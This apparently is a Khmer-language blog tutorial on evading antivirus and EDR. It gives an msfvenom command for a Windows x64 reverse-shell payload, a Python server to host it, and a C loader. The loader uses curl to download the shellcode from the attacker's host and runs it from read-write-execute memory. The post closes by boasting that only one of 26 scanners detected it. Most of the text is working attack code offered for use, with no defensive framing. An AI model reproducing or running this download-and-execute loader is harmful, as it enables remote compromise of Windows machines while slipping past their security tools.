---
title: "Evading AV/EDR with Curl Command"
date: 2023-06-29T21:01:06+07:00
description: វិធីសាស្ត្រ Evading AV/EDR ដោយប្រើប្រាស់ពាក្យបញ្ជា Curl
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- c-shellcode
- metasploit
categories:
- Evading
series:
- WinExE
image: images/feature3/terminal.gif
---

ខ្លីៗអំពីការ Bypass AV/EDR តាមរយៈពាក្យបញ្ជា Curl ដោយប្រើប្រាស់ភាសា C ។

#### Generate Payload
ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាឯកសារ Raw គោលដៅលើម៉ាស៊ីន 64 bit ។

<b>បញ្ជាក់៖</b> Payload នេះដំណើរការតែក្នុងម៉ាស៊ីនវីនដូ ៨/10/11 ឡើងប៉ុណ្ណោះ ។

{{< highlight bash "linenos=table" >}}
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f raw -o cat.bin
{{< / highlight >}}

#### Live Payload
ក្រោយពីបង្កើត Payload រួចយើងបង្កើត Server ដើម្បីបង្ហោះវាក្នុងគោលបំណងទាញយកមកប្រើប្រាស់វិញនៅជំហ៊ានបន្ទាប់ ។

{{< highlight python3 "linenos=table" >}}
python3 -m http.server -d payloadDir 8000
{{< / highlight >}}

#### PWN The Code
តស់ចាប់ផ្ដើមបង្កើត FUD Payload ដោយប្រើប្រាស់ពាក្យបញ្ជា Curl ក្នុងភាសារ C ដើម្បីទាញយក Beacon និងបើកដំណើរការពីចំងាយ ។

{{< highlight c "linenos=table" >}}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
int main()
{
    FILE *fpipe;
    char *command = "curl http://192.168.60.136:8000/cat.bin";
    char c = 0;
    unsigned char code[460]; //ប្ដូរចំនួនលេខទៅតាមទំហំនៃ bytes របស់ payload
    //ex: Payload size: 460 bytes
    int counter = 0;
if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }
while (fread(&c, sizeof c, 1, fpipe))
    {
        code[counter] = c;
        printf("%c", code[counter]);
        counter = counter + 1;
    }
pclose(fpipe);
    
    void *exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 memcpy(exec, code, sizeof code);
 ((void(*)())exec)();
 return 0;
}
{{< / highlight >}}

បន្ទាប់មក Compile Payload តាមធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។

#### Demo
ចុចដំណើរការក្នុងម៉ាស៊ីនវីនដូ ១០ ។

![Download and Execute Payload](/en/posts/img/2023/06/evading-avedr-with-curl-in-c/exec-fud-payload.png)

ទទួលបាន Reverse Shell ។

![Got Reverse Shell](/en/posts/img/2023/06/evading-avedr-with-curl-in-c/got-reverse-shell.png)

#### Scan Result

ខាងក្រោមជាលទ្ធផលពីការ Scan របស់កម្មវិធីកំចាត់មេរោគល្បីៗ ។

![Scan Result](/en/posts/img/2023/06/evading-avedr-with-curl-in-c/scan-results.png)

ញ៉ាក់សាច់ទេ? ហិហិហិ ១ លើ ២៦ ៕

<b>លទ្ធផលតេស្ត៖</b> [ANTISCAN.ME](https://antiscan.me/scan/new/result?id=FFFHoyobVRLK)
<b>សម្រង់ចេញពី៖</b> [MEDIUM](https://medium.com/@lsecqt/creating-fully-undetectable-payload-fud-with-c-46a734837d1c)